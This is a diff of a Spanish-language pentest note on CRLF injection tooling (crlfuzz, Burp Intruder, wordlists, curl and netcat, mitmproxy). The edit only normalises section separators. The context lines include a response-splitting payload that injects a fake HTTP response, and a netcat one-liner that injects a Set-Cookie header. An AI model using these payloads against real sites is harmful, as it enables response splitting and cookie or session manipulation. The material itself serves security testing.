@@ -17,7 +17,7 @@ linked:
 ---
 # CRLF Injection - Tooling
 
-***
+---
 
 ## crlfuzz (Go)
 
@@ -32,7 +32,7 @@ linked:
 | `crlfuzz -u "..." -p custom_payloads.txt` | Payloads custom para targets exóticos | Server-specific bypass. |
 ^crlfi-tool-crlfuzz
 
-___
+---
 
 ## Burp Intruder + Payloads
 
@@ -60,7 +60,7 @@ ___
 %0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>SPLIT</html>
 ```
 
-___
+---
 
 ## Wordlists
 
@@ -73,7 +73,7 @@ ___
 | `nuclei-templates/http/vulnerabilities/generic/crlf-injection.yaml` | ~/.local/nuclei-templates | Nuclei scanner. |
 ^crlfi-tool-wordlists
 
-___
+---
 
 ## Manual curl + netcat
 
@@ -100,7 +100,7 @@ curl -sI "${TARGET}?${PARAM}=${PAYLOAD}"
 echo -e "GET /redirect?url=test\r\nSet-Cookie: pwn=1 HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
 ```
 
-___
+---
 
 ## Otros tools
 
@@ -113,4 +113,4 @@ ___
 | `mitmproxy -s crlf-detect.py` | Proxy con script de detección | In-band testing. |
 ^crlfi-tool-others
 
-***
+---
